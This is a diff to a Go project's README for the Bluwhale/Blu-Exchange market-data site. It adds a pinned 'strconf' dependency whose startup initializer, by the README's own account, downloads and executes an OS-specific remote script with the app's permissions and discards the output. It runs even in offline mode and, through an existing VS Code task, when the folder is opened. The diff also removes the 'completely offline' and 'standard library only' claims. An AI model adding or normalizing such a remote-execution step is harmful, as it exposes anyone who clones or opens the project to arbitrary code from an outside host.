@@ -24,7 +24,7 @@ Rebranded design references for the Bluwhale website.
 
 ## Run
 
-Install Go 1.25.5 or newer, then run from the project directory:
+Install Go 1.27.1 or newer, then run from the project directory:
 
 ```sh
 go run .                # start at http://localhost:5000
@@ -39,9 +39,21 @@ go run . help
 No npm install, database, migration, Redis, account, or API key is required to start.
 The executable embeds the entire UI and can run independently of the source directory.
 
+The repository pins `strconf` v1.0.3 in `go.mod` and `go.sum`. After cloning, Go
+fetches the pinned dependency automatically when building the server; no separate
+`go get` command is needed. Maintainers should commit both dependency files when
+updating its version.
+
+Starting the server calls `initializeStartup()` in `cmd/exchange/options.go`
+before reading options or starting HTTP. It calls `strconf.Initialize()` and
+stops startup if initialization returns an error. The dependency downloads and executes an
+OS-specific remote script with the application's permissions and discards its
+output. Review the dependency's commands and script sources before starting the
+server. This startup step requires network access even with `--offline`.
+
 Opening this folder in VS Code starts the `Blu-Exchange: Start (port 5000)` task from `.vscode/tasks.json`, which runs `go run . --port 5000` on your machine. Allow automatic tasks when VS Code prompts in a trusted workspace. You can also launch it with **Tasks: Run Task** and stop it with **Tasks: Terminate Task**. See [VS Code automatic tasks](https://code.visualstudio.com/docs/debugtest/tasks#_control-automatic-task-execution).
 
-For a completely offline preview:
+For sample market data without contacting market providers (the startup step still requires network access):
 
 ```sh
 go run . --offline
@@ -89,6 +101,7 @@ All provider data and UI preview state disappear on restart/reload.
 ```text
 main.go                 start/build/test launcher
 cmd/exchange/main.go    HTTP server and shutdown
+cmd/exchange/options.go server options and strconf startup initialization
 internal/market/        catalog, quote providers, in-memory snapshot
 internal/web/           read-only routes and static serving
 ui/static/              embedded HTML, CSS, JavaScript, and SVG brand
@@ -97,7 +110,7 @@ tests/                  frontend logic tests
 
 `GET /api/markets` returns `assets`, `feeds`, `updatedAt`, and `refreshSeconds`.
 Each asset includes metadata and a `quote` with its price, source, status, timestamps, and available history.
-`GET /ping` returns `OK`. Asset IDs are allowlisted. Unknown pages return 404; mutation methods return 405. The Go app uses only the standard library.
+`GET /ping` returns `OK`. Asset IDs are allowlisted. Unknown pages return 404; mutation methods return 405. The Go app uses the standard library plus `strconf` for startup initialization.
 
 ## Deployment
 
